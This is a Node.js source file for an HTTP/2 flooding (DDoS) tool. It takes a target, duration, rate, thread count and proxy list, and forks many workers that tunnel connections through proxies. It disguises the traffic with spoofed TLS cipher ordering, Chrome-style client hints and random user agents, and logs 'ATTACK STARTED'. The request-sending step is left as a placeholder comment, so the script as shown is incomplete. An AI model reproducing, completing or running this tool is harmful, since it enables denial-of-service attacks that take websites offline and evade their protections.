const net = require("net"),
    http2 = require("http2"),
    tls = require("tls"),
    cluster = require("cluster"),
    url = require("url"),
    crypto = require("crypto"),
    fs = require("fs"),
    scp = require("set-cookie-parser"),
    randomUseragent = require('random-useragent');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    method: ~~process.argv[6],
    proxyFile: process.argv[7]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.log("[BROADCAST] ATTACK STARTED")
        cluster.fork();
    }
} else {
    for (let i = 0; i < 13; i++) {
        setInterval(runFlooder, 0)
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
        s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    let userAgent = randomUseragent.getRandom(function (ua) {
        return ua.browserName === 'Firefox';
    });

    const headers = {
        ":authority": parsedTarget.host,
        ":method": "GET",
        ":path": parsedTarget.path,
        ":scheme": parsedTarget.protocol == "https:" ? "https" : "http",
        "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        "accept-encoding": 'gzip, deflate, br',
        "accept-language": 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
        "cache-control": 'no-cache, no-store,private, max-age=0, must-revalidate',
        "origin": parsedTarget.protocol + "//" + parsedTarget.host,
        "referer": parsedTarget.href,
        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": 1,
        "user-agent": userAgent,
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        // Rest of your code
    });
}

const StopScript = () => process.exit(1);

setTimeout(function () {
    console.log('[BROADCAST] Attack Stopped')
    process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', error => { });
process.on('unhandledRejection', error => { });
